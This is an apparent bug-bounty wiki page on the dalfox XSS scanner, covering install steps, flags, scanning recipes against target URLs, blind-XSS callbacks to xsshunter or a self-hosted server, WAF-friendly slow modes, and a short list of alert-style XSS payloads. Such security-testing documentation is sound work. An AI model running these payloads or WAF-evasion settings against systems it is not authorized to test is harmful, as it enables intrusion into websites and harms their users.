---
type: wiki
category: tool
tool: dalfox
status: active
last-updated: 2026-04-21
source: https://github.com/hahwul/dalfox
---

# Tool: dalfox (dedicated XSS scanner)

> **Purpose:** A stronger **XSS scanner** than nuclei's DAST mode. Actually executes payloads via a headless browser to verify them.
> Built-in hundreds of payloads + WAF bypass techniques.

## Installation

```bash
# Go install
go install github.com/hahwul/dalfox/v2@latest

# Homebrew
brew install dalfox

# Confirm installation
dalfox version
```

## Basic usage

```bash
# Single URL (with params)
dalfox url "https://target.com/search?q=test"

# Pipe mode
echo "https://target.com/search?q=test" | dalfox pipe

# File mode
dalfox file urls.txt

# With auth
dalfox url "https://target.com/search?q=test" \
  -H "Cookie: sess=xxx" \
  -H "Authorization: Bearer yyy"
```

## Essential flags

| Flag | Purpose |
|------|------|
| `url URL` | Single URL |
| `pipe` | Read from stdin |
| `file f.txt` | URL list |
| `-H 'K: v'` | Add header |
| `-d 'a=b'` | POST data |
| `-X POST` | HTTP method |
| `-F` | Follow redirect |
| `-b https://yourblind.xss.ht` | Blind XSS payload |
| `-p q,s,keyword` | Only fuzz these params |
| `--custom-payload payload.txt` | Custom payload |
| `--only-discovery` | Only find reflected params, don't send XSS payloads |
| `--only-poc r,g,v` | Only output specific POC types |
| `--skip-bav` | Skip BAV (basic attack vector) |
| `--skip-mining-all` | Skip param mining |
| `--skip-mining-dict` | Skip dictionary mining |
| `--skip-mining-dom` | Skip DOM mining |
| `--mining-dict-word word.txt` | Custom mining dictionary |
| `--silence` | Only output findings |
| `-w 50` | Worker count (parallelism) |
| `--delay 200` | Delay per request (ms) |
| `--timeout 10` | Timeout |
| `-o file.txt` | Output |
| `--format json` | JSON output |
| `-S` | Use system proxy |
| `--proxy http://127.0.0.1:8080` | Proxy (Burp) |
| `--cookie 'sess=xxx'` | Add cookie |
| `--user-agent 'UA'` | Custom UA |
| `--remote-payloads 'portswigger'` | Download latest payloads from PortSwigger |
| `--remote-wordlists 'assetnote-small'` | Download wordlist from assetnote |

## Recommended combinations

### Quick XSS check against an endpoint

```bash
dalfox url "https://target.com/search?q=test" \
  --silence \
  --skip-bav
```

### Feeding gf xss output

```bash
# crawl-chain generates gf_xss.txt (suspicious URLs containing ?param=)
dalfox file crawl_chain_out/target/07_gf_xss.txt \
  --skip-bav \
  --skip-mining-all \
  -w 30 \
  --silence \
  -o dalfox.txt
```

### With blind XSS callback

```bash
# 1. Register at https://xsshunter.com to get a payload URL
# 2. Feed it into dalfox
dalfox file urls.txt \
  -b 'https://yourhandle.xss.ht' \
  --silence
```

### Only discover reflected params (don't actually send XSS)

```bash
# Ultra-low-noise — only check which params reflect
dalfox url "https://target.com/search?q=test&cat=all" \
  --only-discovery \
  --silence
```

### Government targets (slow mode)

```bash
dalfox file urls.txt \
  --delay 2000 \
  -w 3 \
  --timeout 15 \
  --skip-bav \
  --silence \
  -o dalfox_gov.txt
```

### With Burp (for debugging)

```bash
dalfox url "https://target/search?q=test" \
  --proxy http://127.0.0.1:8080 \
  --silence
```

## Sample output

```
[V] Triggered XSS Payload (found DOM Object in headless)
[POC][G][GET] https://target.com/search?q="><script>alert(1)</script>
 └ Evidence: type="text" value=""><script>alert(1)</script>"
 └ Classification: Reflected XSS

[V][POC][G][GET] https://target.com/redirect?url=javascript:alert(1)
 └ Evidence: Redirected to javascript: URL
```

`[V]` = Verified (dalfox actually saw the alert trigger via headless browser)

## XSS payload categories

Built into dalfox:

| Category | Description |
|------|------|
| Common | `<script>`, `<img>`, `<svg>`, etc. |
| In-HTML | String injection into HTML context |
| In-Attribute | `"` breakout |
| In-JS | JS context (string / template literal) |
| DOM | `innerHTML`, `document.write`, `location.hash` |
| Blind | Requires XSS Hunter callback |
| Polyglot | Multi-context universal payload |

### Custom payload

```bash
# payload.txt
"><svg/onload=prompt(1)>
'><img src=x onerror=alert(1)>
javascript:alert(1)//

# Usage
dalfox url "https://target/search?q=test" \
  --custom-payload payload.txt \
  --silence
```

## Combining with other tools

### katana → dalfox

```bash
katana -u https://target -d 5 -jc -silent | \
  grep "=" | \
  dalfox pipe --silence
```

### gau → dalfox

```bash
gau --subs target.com | \
  uro | \
  grep "?" | \
  dalfox pipe --silence
```

### Full chain (katana + gau + gf + dalfox)

```bash
# This is what crawl-chain does
bbflow hunt target --only crawl-chain
```

## Advanced: self-hosting XSS Hunter

If you don't want to use xsshunter.com (public):

```bash
# 1. Self-host ezxss
docker run -d -p 80:80 \
  -e DOMAIN=oast.yourdomain.com \
  ssl917/ezxss

# 2. Point dalfox at your own URL
dalfox file urls.txt -b 'https://oast.yourdomain.com/callback'
```

## Notes

### It actually sends XSS payloads

- Only run against **authorized targets**
- `--skip-bav` skips BAV testing (reduces noise)
- For government targets, recommend `--delay 2000 -w 3`

### WAF-friendly mode

```bash
dalfox url "https://target/search?q=test" \
  --delay 3000 \
  -w 1 \
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  --silence
```

### Headless browser requires Chrome installed

```bash
# macOS
brew install chromium

# Linux
sudo apt install chromium-browser
```

## bbflow integration

```bash
# hunt-dalfox-xss hunter
bbflow hunt target --only dalfox-xss

# or crawl-chain Stage 10
bbflow hunt target --only crawl-chain
```

## FAQ

### Q: How do I report an XSS found by dalfox?
A:
1. Copy the POC URL from dalfox's output
2. Resend it in Burp Repeater to confirm
3. Open the URL directly in Chrome to confirm the alert actually fires
4. Screenshot + record video + curl command

### Q: How do I tell self-XSS apart from reflected XSS?
A:
- Open the PoC URL in **another browser session / incognito mode**
- If it still triggers → Reflected (valuable)
- If it doesn't → Self-XSS (not valuable, most programs mark it N/A)

### Q: Found XSS but CSP is blocking it?
A:
- Analyze the CSP: `curl -sI target | grep -i content-security-policy`
- Look for CSP bypasses (no safe-inline / unsafe-eval / missing nonce)
- Clearly note the CSP constraint in your report

## Related files

- [15-nuclei-attack-templates.md](15-nuclei-attack-templates.md) §XSS
- [13-hunter-crawl-chain.md](13-hunter-crawl-chain.md) §Stage 10
- [14-waf-bypass-commands.md](14-waf-bypass-commands.md) §Payload encoding
